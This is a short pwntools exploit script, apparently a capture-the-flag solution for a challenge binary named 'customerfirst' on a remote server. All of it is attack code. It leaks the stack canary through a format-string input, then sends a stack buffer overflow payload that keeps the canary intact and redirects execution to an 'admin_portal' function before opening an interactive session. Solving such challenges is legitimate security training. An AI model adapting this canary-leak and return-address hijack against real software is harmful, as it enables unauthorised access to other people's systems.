from pwn import *
from time import sleep

context.binary = ELF('./customerfirst', checksec=False)
p = remote('pwn.sigx.net', 3104)
p.recvuntil(b"Enter your name:")
p.sendline(b"%17$p") #leak canary
p.recvuntil(b"Thanks for using our form ")
canary_leak = p.recvline().strip().decode()
canary = int(canary_leak, 16)
canary_bytes = p64(canary, endian='little', signed=False)
log.success(f"Leaked canary: {canary:#x}")
p.recvuntil(b"Please type in your request:")
payload = (
    b'A' * 40 + canary_bytes + b'B' * 8 +    
    p64(0x401427) + #alignment addr
    p64(0x4012f4)     #admin_portal addr
)

log.info(f"Sending payload ({len(payload)} bytes)")
p.sendline(payload) 
output = p.recvall(timeout=2) 
print(output.decode(errors='ignore')) 
p.interactive()
